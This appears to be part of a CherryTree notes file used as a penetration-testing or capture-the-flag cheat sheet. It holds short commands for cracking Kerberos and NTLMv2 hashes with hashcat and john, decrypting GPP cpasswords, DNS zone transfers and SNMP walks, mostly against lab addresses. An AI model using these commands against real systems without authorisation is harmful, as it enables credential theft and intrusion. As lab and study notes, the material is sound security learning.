        <rich_text justification="left"></rich_text>
        <rich_text>
____________________________________________


</rich_text>
        <rich_text scale="h3">Cracking TGTs</rich_text>
        <rich_text>


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
____________________________________________

</rich_text>
        <rich_text scale="h3">Cracking cpassword from old computers with GPP group policy</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


___________________________-


</rich_text>
        <rich_text scale="h2">for NTLMv2 hashes</rich_text>
        <rich_text>



</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
</rich_text>
        <codebox char_offset="39" justification="left" frame_width="1090" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">john --wordlist=passwords_kerb.txt hashes.asreproast

hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 

oro1

hashcat -m 18200 unhashedgetNPUsers.log passwordlist.txt</codebox>
        <codebox char_offset="104" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hashcat -m 13100 hashTGT.log /opt/wordlist/rockyou.txt</codebox>
        <codebox char_offset="213" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gpp-decrypt eHHHHyourReallyLongHash</codebox>
        <codebox char_offset="269" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hashcat -a 0 -m 5600 hashes.ntlmv2 /usr/share/wordlists/rockyou.txt -o cracked.txts</codebox>
      </node>
      <node name="Vulnerabilities" unique_id="47" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690556" ts_lastsave="1687690564">
        <node name="SQLInjection" unique_id="48" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690564" ts_lastsave="1687690570">
          <rich_text link="webs https://github.com/nigamelastic/Writeups/blob/master/BsidesCTF/2022/Web.md">https://github.com/nigamelastic/Writeups/blob/master/BsidesCTF/2022/Web.md</rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h3">connecting to sql</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

This prompts me to log into MySQL. I use the password given, then type:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

For help check


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
</rich_text>
          <codebox char_offset="95" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">mysql -u dbuser -p password</codebox>
          <codebox char_offset="171" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">use drupaldb;</codebox>
          <codebox char_offset="191" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">mysql --help</codebox>
        </node>
      </node>
      <node name="DNS" unique_id="103" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1700383990" ts_lastsave="1700384143">
        <rich_text scale="h2">Perform nslookup first </rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


once u know the subdomain u can use this for a dnz zonetransfer to identify more subdomains:

</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="25" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nslookup 10.10.11.152 10.10.11.152 </codebox>
        <codebox char_offset="123" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">dig axfr @10.10.11.152cronos.htb</codebox>
      </node>
      <node name="SNMP" unique_id="106" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1706989717" ts_lastsave="1706994186">
        <rich_text>
Use SNMP walk like:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

or

</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="22" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">snmpwalk -v1 -c public 10.10.11.152</codebox>
        <codebox char_offset="29" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">snmpwalk -v2c -c public 10.10.11.152</codebox>
      </node>
    </node>
  </node>
</cherrytree>
